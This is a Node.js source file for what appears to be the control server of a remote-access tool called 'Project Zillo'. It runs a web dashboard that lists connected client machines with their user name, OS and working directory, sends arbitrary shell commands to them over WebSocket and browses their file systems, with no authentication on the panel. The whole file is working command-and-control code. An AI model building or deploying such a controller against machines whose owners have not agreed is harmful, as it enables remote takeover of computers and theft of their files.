// WebSocket
const WebSocket = require("ws");
let server = require("http").createServer();

// Express
const express = require("express")
const app = express()
const port = 6969
const bodyParser = require('body-parser');

app.set("views", __dirname + "/views");
app.set("view engine", "ejs");

app.use(bodyParser.urlencoded({extended: false}));
app.use(express.static("public"))

let clients = [];

app.get("/", (req, res) => {
    res.render("dashboard", {
        clients: clients,
    });
})

//client dashboard
app.get("/:id", (req, res) => {
    let id = req.params.id;

    let client = clientFromId(id);
    if (client) {
        res.render("client", {
            client: client,
        })
    } else {
        res.render("error", {
            message: "client not found",
        })
    }
})


// execute command
app.post("/:id/exec", (req, res) => {
    let id = req.params.id;
    let cmd = req.body.cmd;

    let client = clientFromId(id);
    if (client) {
        let instruction = JSON.stringify({
            type: "exec",
            value: cmd,
        })

        client.socket.send(instruction)

        res.redirect("/" + client.id);
    } else {
        res.render("error", {
            message: "invalid client",
        })
    }
})

// file viewer
app.get("/:id/fileviewer", (req, res) => {
    let id = req.params.id;
    
    let client = clientFromId(id);
    if (client) {
        res.render("fileviewer", {
            client: client,
            reply: {},
        })
    } else {
        res.render("error", {
            message: "client not found",
        })
    }
})

app.post("/:id/fileviewer", (req, res) => {
    let id = req.params.id;
    let path = req.body.path;

    let client = clientFromId(id);
    if (client) {
        let instruction = {
            type: "fileview",
            value: path,
            todo: "list",
            from: "43929",
        }

        client.socket.sendAsync(instruction, function(reply) {
            res.render("fileviewer", {
                client: client,
                path: path,
                goUp: goUp,
                files: JSON.parse(reply.value),
            })
        });
    } else {
        res.render("error", {
            message: "invalid client",
        })
    }
})

function goUp(url){
    if (url.endsWith("/")) url = url.substring(0,url.length-1)
    url = url.replace("//", "/");
    const lastSlashPosition = url.lastIndexOf("/"); 
  
    return lastSlashPosition <=7 ? url: url.substring(0,lastSlashPosition);
}

function clientFromId(id) {
    for (let i = 0; i < clients.length; i++) {
        let client = clients[i];
        if (client.id == id) {
            return client;
        }
    }

    return false;
}

const wss = new WebSocket.Server({
    server: server,
    perMessageDeflate: false
});

server.on("request", app);

wss.on("connection", function(ws, req) {
    console.log("Connected with " + ws._socket.remoteAddress);

    ws.sendAsync = function(json, call) {
        let from = json.from;

        this.send(JSON.stringify(json));

        function socketReply(message) {
            let json = JSON.parse(message)

            if (json) {
                let type = json.type;
                let to = json.to;
                if (type == "reply" && (to == from)) {
                    call(json);
                    this.removeEventListener("message", socketReply);
                }
            }
        }

        this.on("message", socketReply)
    }

    ws.on("message", function(message) {
        let json = JSON.parse(message)

        if (json) {
            let type = json.type;
            if (type == "connection") {
                let name = json.user;
                let os = json.os;
                let path = json.dir;

                clients.push({
                    id: clients.length+1,
                    name: name,
                    os: os,
                    path: path,
                    socket: ws,
                });
            } else if (type == "reply") {
                //console.log(json);
            }
        } else {
            console.log("Not succesful JSON");
        }
    })

    ws.on("close", function() {
        for (let i = 0; i < clients.length; i++) {
            var client = clients[i];
            if (client.socket == ws) {
                clients.splice(i, 1);
            }
        }
    })
});

server.listen(port, function() {
    console.log("Project Zillo initiated");
});